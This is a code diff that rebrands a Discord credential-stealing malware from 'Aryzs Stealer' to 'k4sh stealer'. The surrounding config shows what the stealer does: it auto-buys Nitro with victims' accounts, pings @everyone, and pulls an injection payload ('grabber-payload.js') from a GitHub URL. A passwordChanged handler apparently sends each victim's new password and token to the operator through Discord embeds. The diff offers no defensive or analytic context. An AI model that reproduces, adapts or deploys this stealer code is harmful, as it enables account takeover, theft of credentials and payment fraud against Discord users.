@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Aryzs Stealer', 
+  embed_name: 'k4sh stealer', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://raw.githubusercontent.com/haxdeveloper/AryzsStealer/master/grabber-payload.js', 
+  injection_url: 'https://raw.githubusercontent.com/haxdeveloper/k4sh stealer/master/grabber-payload.js', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -765,7 +765,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'k4sh stealer',
           },
         },
       ],
@@ -814,7 +814,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'k4sh stealer',
           },
         },
       ],
@@ -861,7 +861,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'k4sh stealer',
           },
         },
       ],
@@ -908,7 +908,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'k4sh stealer',
           },
         },
       ],
@@ -957,7 +957,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'k4sh stealer',
           },
         },
       ],
